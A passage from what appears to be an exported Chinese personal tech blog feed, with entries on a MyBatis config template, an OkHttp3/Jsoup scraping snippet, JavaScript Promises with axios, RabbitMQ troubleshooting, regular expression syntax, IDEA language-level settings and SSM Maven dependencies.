<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>OkHttp3爬虫+FastJson解析json+Jsoup解析Document节点+文本写入文件</title>
    <url>/2022/06/06/OkHttp3%E7%88%AC%E8%99%AB-FastJson%E8%A7%A3%E6%9E%90json-Jsoup%E8%A7%A3%E6%9E%90Document%E8%8A%82%E7%82%B9+%E6%96%87%E6%9C%AC%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="爬虫-JSON-Document-文件写入"><a href="#爬虫-JSON-Document-文件写入" class="headerlink" title="爬虫 + JSON + Document + 文件写入"></a>爬虫 + JSON + Document + 文件写入</h2><span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String url = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用okhttp3中的OKHttpClient请求，获取到Response（网络请求）</span></span><br><span class="line"><span class="comment">//注意①：Okhttp中的请求头不允许有中文，解决方法：将含有中文的请求头信息进行编码</span></span><br><span class="line"><span class="comment">//注意②：如果Cookie太长，直接通过复制值粘贴，则可能出现复制不全的情况，导致网络请求失败或者错误</span></span><br><span class="line">OkHttpClient httpClient = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">    .addHeader(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36&quot;</span>)</span><br><span class="line">    .url(url)</span><br><span class="line">    .build();</span><br><span class="line">Response response = httpClient.newCall(request).execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用alibaba的fastjson进行字符串和JSON格式的转换（JSON格式）</span></span><br><span class="line"><span class="comment">//注意：如果请求到的是json格式，若不先转为json格式，再取相对应的xml内容，则字符串将会一直是Unicode编码（即看不到utf-8的中文）</span></span><br><span class="line">String responseString = response.body().string();</span><br><span class="line">System.out.println(responseString);</span><br><span class="line">JSONObject jsonObject = JSONObject.parseObject(responseString, JSONObject.class);</span><br><span class="line">JSONObject jsonObject1 = jsonObject.getJSONObject(<span class="string">&quot;html&quot;</span>);</span><br><span class="line">String html = jsonObject1.getString(<span class="string">&quot;list&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将获取到的内容（字符类型）写进文件中</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">&quot;C:\\Users\\用户名\\Desktop\\新建文本文档.txt&quot;</span>);</span><br><span class="line">FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">fileOutputStream.write(html.getBytes());</span><br><span class="line"><span class="comment">//关闭文件写入流</span></span><br><span class="line">fileOutputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用Jsoup将字符串转为Document格式（XML格式），方便获取到指定的节点标签的内容</span></span><br><span class="line">Document document = Jsoup.parse(html);</span><br><span class="line">Elements imgs = document.getElementsByTag(<span class="string">&quot;h3&quot;</span>);</span><br><span class="line">Element element = imgs.get(<span class="number">0</span>);                  <span class="comment">//获取elements中第一个element元素</span></span><br><span class="line">System.out.println(element.text());             <span class="comment">//得到标签中的文本内容</span></span><br><span class="line">System.out.println(element.nodeName());         <span class="comment">//得到标签名</span></span><br><span class="line">System.out.println(element.tagName());          <span class="comment">//得到标签名</span></span><br><span class="line">element.tagName(<span class="string">&quot;lry&quot;</span>);     <span class="comment">//修改元素的标签名</span></span><br><span class="line">System.out.println(element.isBlock());          <span class="comment">//测试元素是否是块级元素</span></span><br><span class="line">System.out.println(element.parent());           <span class="comment">//得到父节点</span></span><br><span class="line">System.out.println(element.parents());          <span class="comment">//得到元素的父类和祖先节点直到文档的根。返回元素最接近的一个父类的堆栈</span></span><br><span class="line">System.out.println(element.children());         <span class="comment">//得到子元素集</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>Json解析</tag>
        <tag>Document解析</tag>
        <tag>写文件</tag>
      </tags>
  </entry>
  <entry>
    <title>Typora利用PicGo配置Gitee图床</title>
    <url>/2022/05/03/PicGo%E4%B8%AD%E7%9A%84Gitee%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="Gitee图床配置"><a href="#Gitee图床配置" class="headerlink" title="Gitee图床配置"></a>Gitee图床配置</h2><span id="more"></span>

<ol>
<li>添加插件<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503131215750.png" alt="image-20220503131215750"></li>
<li>图床配置<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503132101395.png" alt="image-20220503132101395"></li>
<li>点击“设置为默认图床”</li>
</ol>
<h2 id="Typora中的图像配置"><a href="#Typora中的图像配置" class="headerlink" title="Typora中的图像配置"></a>Typora中的图像配置</h2><p><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503132449416.png" alt="image-20220503132449416"></p>
]]></content>
      <tags>
        <tag>Typora图床配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Promise在前端的作用</title>
    <url>/2021/10/21/Promise%E5%9C%A8%E5%89%8D%E7%AB%AF%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Promise的执行规则"><a href="#Promise的执行规则" class="headerlink" title="Promise的执行规则"></a>Promise的执行规则</h2><span id="more"></span>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;  </span><br><span class="line">                <span class="comment">//resolve(&quot;第一个参数&quot;);     </span></span><br><span class="line">                reject(<span class="string">&quot;第二个参数&quot;</span>);       </span><br><span class="line">            &#125;, <span class="number">2000</span>)</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">val</span> =&gt;</span> &#123; </span><br><span class="line">    		<span class="built_in">console</span>.log(<span class="string">&quot;执行了resolve&quot;</span>)</span><br><span class="line">        &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;执行了reject&quot;</span>);</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p><strong>读懂代码如何执行，就懂了promise的使用了</strong></p>
<p><strong>一定要看懂它们！！！</strong></p>
<p><strong>一定要看懂它们！！！</strong></p>
<p><strong>一定要看懂它们！！！</strong></p>
<p>Promise的构造函数中，是一个函数（暂时本文私底下就叫它“小涵“吧），这个函数也需要两个参数（一般命名为resolve、reject），resolve和reject这两个参数也是函数。<strong>巧妙之处就在于：</strong>当Promise构造函数的参数”小涵“中执行了resolve（可传参）这个函数，就会执行Promise后面的then函数，同时resolve的实参，会传给then中形参；同理，如果执行了reject（可传参）函数，就会执行Promise后面的catch函数，同时reject的实参，会传给catch中的形参。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>根据上面分析的promise的特点，前端通常会用它辅助Axios网络请求一块使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      axios(&#123;	<span class="comment">//在Promise的内部可以执行一个axios的一个网络请求，然后根据axios的执行结果，选择执行resolve和reject函数</span></span><br><span class="line">            url: url</span><br><span class="line">            method: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">            data: &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">              resolve(res.data);	<span class="comment">//请求成功，执行resolve</span></span><br><span class="line">              <span class="comment">// console.log(res);</span></span><br><span class="line">          &#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">              reject(error);		<span class="comment">//请求失败，执行reject</span></span><br><span class="line">              <span class="comment">// console.log(error);</span></span><br><span class="line">          &#125;);</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="built_in">console</span>.log(<span class="string">&quot;执行成功，请求结果为：&quot;</span> + data);</span><br><span class="line">	&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="built_in">console</span>.log(<span class="string">&quot;执行失败，失败信息为：&quot;</span> + err);</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在执行axios请求的时候，我们一般还会在Promise内部，在加一层setTimeOut（function（）{}，1000），将axios请求的代码，放到setTimeOut中去。</p>
]]></content>
      <tags>
        <tag>Promise的使用</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMQ常见问题</title>
    <url>/2024/05/13/RabbitMQ%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><span id="more"></span>

<h3 id="问题一：安装Rabbit-MQ的管理界面"><a href="#问题一：安装Rabbit-MQ的管理界面" class="headerlink" title="问题一：安装Rabbit MQ的管理界面"></a>问题一：安装Rabbit MQ的管理界面</h3><p><strong>问题描述：</strong></p>
<p>默认情况下，rabbitmq是没有安装web端的客户端插件，需要安装才可以生效</p>
<p><strong>解决方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rabbitmq-plugins <span class="built_in">enable</span> rabbitmq_management</span><br></pre></td></tr></table></figure>

<h3 id="问题二：VMware挂起后，再重启，RabbitMQ的管理界面访问不了"><a href="#问题二：VMware挂起后，再重启，RabbitMQ的管理界面访问不了" class="headerlink" title="问题二：VMware挂起后，再重启，RabbitMQ的管理界面访问不了"></a>问题二：VMware挂起后，再重启，RabbitMQ的管理界面访问不了</h3><p><strong>解决方法：</strong>重新启动docker服务，命令如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker	<span class="comment"># 重启docker服务</span></span><br><span class="line">service docker restart		<span class="comment"># 效果同上</span></span><br></pre></td></tr></table></figure>

<h3 id="问题三：使用fanout模式指定routing-key发布消息，无法过滤"><a href="#问题三：使用fanout模式指定routing-key发布消息，无法过滤" class="headerlink" title="问题三：使用fanout模式指定routing-key发布消息，无法过滤"></a>问题三：使用fanout模式指定routing-key发布消息，无法过滤</h3><p><strong>解答：</strong></p>
<p>fanout模式发布消息后，全部队列都会收到消息，即使指定了routing-key也没用。要想实现根据routing-key过滤推送的效果，可以使用direct路由、topic模式</p>
<h3 id="问题四：在代码中修改了队列声明时的配置，运行报错"><a href="#问题四：在代码中修改了队列声明时的配置，运行报错" class="headerlink" title="问题四：在代码中修改了队列声明时的配置，运行报错"></a>问题四：在代码中修改了队列声明时的配置，运行报错</h3><p><strong>解答：</strong></p>
<p>如果在<strong>队列已经存在</strong>，然后修改了代码中的队列的声明时的配置，再次运行代码，修改并不会生效，且会报错。</p>
<p><strong>解决方法：</strong>需要将队列删除，重新执行代码，创建队列</p>
]]></content>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>Regular Expression</title>
    <url>/2023/01/18/Regular%20Expression/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">graph LR </span><br><span class="line">A(正则表达式)--&gt;B(语法)</span><br><span class="line">B--&gt;B1(普通字符)</span><br><span class="line">B--&gt;B2(非打印字符)</span><br><span class="line">B--&gt;B3(特殊字符)</span><br><span class="line">B--&gt;B4(限定符)</span><br><span class="line">B--&gt;B5(定位符)</span><br><span class="line">B--&gt;B6(选择)</span><br><span class="line">B--&gt;B7(反向引用)</span><br><span class="line">A--&gt;C(修饰符)</span><br><span class="line">A--&gt;D(元字符)</span><br><span class="line">A--&gt;E(运算符优先级)</span><br><span class="line">A--&gt;F(匹配规则)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgse.com/i/pS3zuZV"><img src="https://s1.ax1x.com/2023/01/19/pS3zuZV.png" alt="pS3zuZV.png"></a></p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h3><p>普通字符没有显示指定为元字符的所有<strong>可打印</strong>和<strong>不可打印</strong>字符（<strong>单个字符</strong>）。</p>
<p>包括大写和小写字母、所有数字、所有标点符号、一些其他符号。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>[ABC]</strong></td>
<td>匹配[…]中的所有字符</td>
</tr>
<tr>
<td><strong>[^ABC]</strong></td>
<td>匹配除了[…]中的所有字符</td>
</tr>
<tr>
<td><strong>[A-Z]</strong></td>
<td>[A-Z] 表示一个区间，匹配所有大写字母，[a-z] 表示所有小写字母。</td>
</tr>
<tr>
<td><strong>.</strong></td>
<td>匹配除换行符（\n、\r）之外的任何单个字符，相等于[^\n\r]</td>
</tr>
<tr>
<td><strong>[\s\S]</strong></td>
<td>匹配所有。\s 是匹配所有空白符，包括换行，\S 非空白符，不包括换行。</td>
</tr>
<tr>
<td><strong>\w</strong></td>
<td>匹配字母、数字、下划线。等价于 [A-Za-z0-9_]</td>
</tr>
</tbody></table>
<h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>\cx</strong></td>
<td>匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td><strong>\f</strong></td>
<td>匹配一个换页符。等价于 \x0c 和 \cL。</td>
</tr>
<tr>
<td><strong>\n</strong></td>
<td>匹配一个换行符。等价于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td><strong>\r</strong></td>
<td>匹配一个回车符。等价于 \x0d 和 \cM。</td>
</tr>
<tr>
<td><strong>\s</strong></td>
<td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。</td>
</tr>
<tr>
<td><strong>\t</strong></td>
<td>匹配一个制表符。等价于 \x09 和 \cI。</td>
</tr>
<tr>
<td><strong>\S</strong></td>
<td>匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td>
</tr>
<tr>
<td><strong>\v</strong></td>
<td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
</tr>
</tbody></table>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><table>
<thead>
<tr>
<th>特别字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>$</strong></td>
<td>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td>
</tr>
<tr>
<td><strong>( )</strong></td>
<td>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
</tr>
<tr>
<td>*****</td>
<td>匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。</td>
</tr>
<tr>
<td><strong>+</strong></td>
<td>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</td>
</tr>
<tr>
<td><strong>.</strong></td>
<td>匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。</td>
</tr>
<tr>
<td>[</td>
<td>标记一个中括号表达式的开始。要匹配 [，请使用 [。</td>
</tr>
<tr>
<td><strong>?</strong></td>
<td>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
</tr>
<tr>
<td>*<em>*</em></td>
<td>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td><strong>^</strong></td>
<td>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
</tr>
<tr>
<td><strong>{</strong></td>
<td>标记限定符表达式的开始。要匹配 {，请使用 {。</td>
</tr>
<tr>
<td><strong>|</strong></td>
<td>指明两项之间的一个选择。要匹配 |，请使用 |。</td>
</tr>
</tbody></table>
<h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p>指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>*****</td>
<td>匹配前面的子表达式零次或多次。</td>
</tr>
<tr>
<td><strong>+</strong></td>
<td>匹配前面的子表达式一次或多次。</td>
</tr>
<tr>
<td><strong>?</strong></td>
<td>匹配前面的子表达式零次或一次。</td>
</tr>
<tr>
<td><strong>{n}</strong></td>
<td>n 是一个非负整数。匹配确定的 <strong>n</strong> 次。</td>
</tr>
<tr>
<td><strong>{n,}</strong></td>
<td>n 是一个非负整数。至少匹配n 次。</td>
</tr>
<tr>
<td><strong>{n,m}</strong></td>
<td>m 和 n 均为非负整数，其中 n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td>
</tr>
</tbody></table>
<h3 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>^</strong></td>
<td>匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td>
</tr>
<tr>
<td><strong>$</strong></td>
<td>匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td>
</tr>
<tr>
<td><strong>\b</strong></td>
<td>匹配一个单词边界，即字与空格间的位置。</td>
</tr>
<tr>
<td><strong>\B</strong></td>
<td>非单词边界匹配。</td>
</tr>
</tbody></table>
<blockquote>
<p>注：不能将限定符与定位符一起使用。由于在紧靠换行或者单词边界的前面或后面不能有一个以上位置，因此不允许诸如 <strong>^*</strong> 之类的表达式。</p>
</blockquote>
<h3 id="选择-捕获组"><a href="#选择-捕获组" class="headerlink" title="选择+捕获组"></a>选择+捕获组</h3><p>用圆括号 <strong>()</strong> 将所有选择项括起来，相邻的选择项之间用 <strong>|</strong> 分隔。</p>
<p><strong>()</strong> 表示<strong>捕获分组</strong>，**()** 会把每个分组里的匹配的值保存起来， 多个匹配值可以通过数字 n 来查看(<strong>n</strong> 是一个数字，表示第 n 个捕获组的内容)。</p>
<h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><hr>
<p><strong>选择</strong>和<strong>反向引用</strong>待学习补充</p>
<hr>
<h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p>
<p>标记不写在正则表达式里，标记位于表达式之外，格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/pattern/flags</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>修饰符</th>
<th>含义</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>i</strong></td>
<td>ignore - 不区分大小写</td>
<td>将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td>
</tr>
<tr>
<td>g</td>
<td>global - 全局匹配</td>
<td>查找所有的匹配项。</td>
</tr>
<tr>
<td><strong>m</strong></td>
<td>multi line - 多行匹配</td>
<td>使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</td>
</tr>
<tr>
<td>s</td>
<td>特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td>
<td>默认情况下的圆点 <strong>.</strong> 是匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td>
</tr>
</tbody></table>
<h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>直接参见：<a href="https://www.runoob.com/regexp/regexp-metachar.html">正则表达式 – 元字符 | 菜鸟教程 (runoob.com)</a></p>
]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>SDK、Language Level和Compiler version</title>
    <url>/2022/02/26/SDK%E3%80%81Language%20Level%E5%92%8CCompiler%20version/</url>
    <content><![CDATA[<h2 id="SDK、Language-Level是什么？"><a href="#SDK、Language-Level是什么？" class="headerlink" title="SDK、Language Level是什么？"></a>SDK、Language Level是什么？</h2><span id="more"></span>

<p>在Project和Module两个级别中，都可以设置各自的SDK版本和Language Level版本。</p>
<h3 id="①SDK"><a href="#①SDK" class="headerlink" title="①SDK"></a>①SDK</h3><p>​        <strong>SDK：</strong>首先介绍一下SDK，SDK就是指工程Project（模块Module）所依赖的依赖库，在java中一般就是指JDK（可以说JDK就是SDK的一种）。</p>
<h3 id="②Language-Level"><a href="#②Language-Level" class="headerlink" title="②Language Level"></a>②Language Level</h3><p>​        <strong>Language Level：</strong>再介绍一下Language Level，（似乎只有IDEA中出现了这个，而在其他IDE中并没有这个）。Language Level，就是指在进行编程的时候，代码的语法的版本级别。</p>
<p>​        例如：虽然我所引入的SDK是JDK11，但是公司中使用的是JDK8，那么，为了代码在自己电脑和上传服务器后都能正常运行，可以将language level调至jdk8</p>
<p>​        （换一句话说，我引入的是JDK11，但是我只用到其中的JDK8的语法）</p>
<p><strong>一图胜千言！</strong></p>
<p><img src="https://s2.loli.net/2022/02/26/iGdVSUExQAKz4Bp.png" alt="image-20220226224206968"></p>
<h3 id="③Compiler-version"><a href="#③Compiler-version" class="headerlink" title="③Compiler version"></a>③Compiler version</h3><p>​        Compiler version指的是项目build之后的生成文件中所使用的语言版本。</p>
<p>​        事实上，IDEA中并没有这个东西。但是为了将上面两个理解的更完整，我将Java Compiler中的project bytecode version也拿出来讲一下。</p>
<p><img src="https://s2.loli.net/2022/02/26/JknpmqrXgTEu23W.png" alt="image-20220226223919348"></p>
<p>​        可以看到，默认是和Language Level相同等级。而在上图下面的Module中同样可以设置每个Module自己所要编译生成的模块所依赖的语言版本。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        其实，Language Level和Compiler version这两个的存在，就是为了让项目发布后，能够更好的兼容、更好的运行。</p>
<p>​        SDK：编代码时导入的版本（<strong>用不用还不一定</strong>）</p>
<p>​        Language Level：在编写代码时实际使用的版本（<strong>为了方便compile之后，兼容服务器或公司的版本</strong>）</p>
<p>​        Compiler version：build打包生成的依赖版本（一般和Language一样）（<strong>服务器或公司的版本一定要大于等于这个版本，即运行生成文件的环境的版本要大于等于这个版本</strong>）</p>
]]></content>
      <tags>
        <tag>配置</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM开发-依赖-资源导入</title>
    <url>/2021/11/06/SSM%E5%BC%80%E5%8F%91-%E4%BE%9D%E8%B5%96-%E8%B5%84%E6%BA%90%E5%AF%BC%E5%85%A5/</url>
    <content><![CDATA[<h2 id="SSM框架所需要的基本的依赖"><a href="#SSM框架所需要的基本的依赖" class="headerlink" title="SSM框架所需要的基本的依赖"></a>SSM框架所需要的基本的依赖</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--使用mybatis框架--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--用于mysql连接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--用于spring框架--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 